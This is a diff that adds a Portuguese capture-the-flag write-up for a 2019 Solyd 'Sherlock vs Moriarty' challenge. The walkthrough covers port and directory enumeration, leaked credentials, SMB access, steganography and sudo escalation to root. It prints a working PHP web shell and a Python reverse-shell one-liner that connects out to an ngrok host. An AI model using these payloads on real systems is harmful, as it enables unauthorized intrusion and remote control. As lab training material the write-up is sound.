@@ -771,3 +771,225 @@ while 1:
 Solyd{4s_C0iS4s_L4m3nTam_}
 
 >>>>>>> 53b1b739576e517a31b276009d059279c20574b9
+
+
+
+
+
+CTF Solyd 2019 – Desafio 5 (Sherlock vs Moriarty)
+1️⃣ Enumeração inicial
+
+Primeiro passo foi a varredura de portas.
+
+nmap 3.235.124.225
+
+Resultado:
+
+Porta	Serviço
+22	SSH
+25	SMTP (filtered)
+80	HTTP
+139	NetBIOS
+445	SMB
+
+Isso indica três possíveis vetores principais:
+
+Web (porta 80)
+
+SMB (139 / 445)
+
+SSH (22)
+
+2️⃣ Enumeração Web
+
+O site inicialmente não mostrava nada relevante.
+
+Então foi feito bruteforce de diretórios.
+
+Ferramenta usada:
+
+dirb
+
+Durante a enumeração foi encontrado:
+
+/backup.txt
+
+Conteúdo:
+
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+if ($username!="SHeRLock" || $password!="H0LmeS@!01") {
+
+Credenciais descobertas:
+
+SHeRLock : H0LmeS@!01
+Problema encontrado
+
+Mesmo com a senha correta não era possível logar.
+
+Ao analisar a requisição percebeu-se que o formulário alterava o case das letras.
+
+Solução:
+
+Interceptar a requisição usando:
+
+Burp Suite
+
+Modificar manualmente os valores.
+
+Após o envio correto ocorreu redirecionamento para:
+
+credenciais.txt
+
+Conteúdo:
+
+moriarty:#m0ri4rty#
+🚩 Flag 1
+Solyd{f0und_s0m3_h1dd3n_f1l3s}
+3️⃣ Enumeração SMB
+
+Nova varredura:
+
+nmap -A 3.235.124.225
+
+Foi detectado:
+
+Samba
+
+Listando compartilhamentos:
+
+smbclient -L 3.235.124.225
+
+Resultado:
+
+Website
+
+Acesso com credenciais descobertas:
+
+smbclient //3.235.124.225/Website -U moriarty
+
+Arquivos encontrados:
+
+index.php
+login
+validacao.php
+backup.txt
+credenciais.txt
+4️⃣ Upload de Webshell
+
+Foi feito upload de uma shell PHP:
+
+<?php echo(system($_GET['cmd']))?>
+
+Upload:
+
+put shellsherlock.php
+
+Execução via navegador:
+
+http://IP/shellsherlock.php?cmd=id
+5️⃣ Reverse Shell
+
+Criada usando Python:
+
+python3 -c 'import socket,os,pty;
+s=socket.socket();
+s.connect(("NGROK",PORT));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+pty.spawn("/bin/bash")'
+
+Listener:
+
+nc -lvnp PORT
+6️⃣ Estabilizando shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+7️⃣ Flag 2
+
+No diretório root do container:
+
+/flag2
+
+Conteúdo:
+
+Solyd{g0t_th3_r3v_sh3ll}
+8️⃣ Enumeração local
+
+Arquivos interessantes:
+
+.senha
+Professor_Moriarty
+
+Senha encontrada:
+
+chefeMoriarty
+
+O arquivo Professor_Moriarty era uma imagem.
+
+9️⃣ Steganografia
+
+Ferramenta usada:
+
+Steghide
+
+Extração:
+
+steghide extract -sf Professor_Moriarty
+
+Senha:
+
+chefeMoriarty
+
+Arquivo extraído:
+
+ssh.txt
+
+Conteúdo:
+
+moriarty:Mor14rty#@
+🔟 Acesso SSH
+
+Conexão:
+
+ssh moriarty@IP
+🚩 Flag 3
+Solyd{s4w_thr0ugh_th4t_st3g0}
+1️⃣1️⃣ Escalada de privilégio
+
+Verificando sudo:
+
+sudo -l
+
+Resultado:
+
+(ALL) ALL
+(root) NOPASSWD: /home/moriarty/moriarty.rb
+
+Ou seja:
+
+moriarty pode executar qualquer comando como root
+
+Então basta:
+
+sudo -s
+
+ou
+
+sudo bash
+
+Agora:
+
+whoami
+root
+1️⃣2️⃣ Flag final
+
+Arquivo:
+
+/home/moriarty/flag4
+
+Conteúdo:
+
+Solyd{f0ll0w_th3_r1ght_p4th}
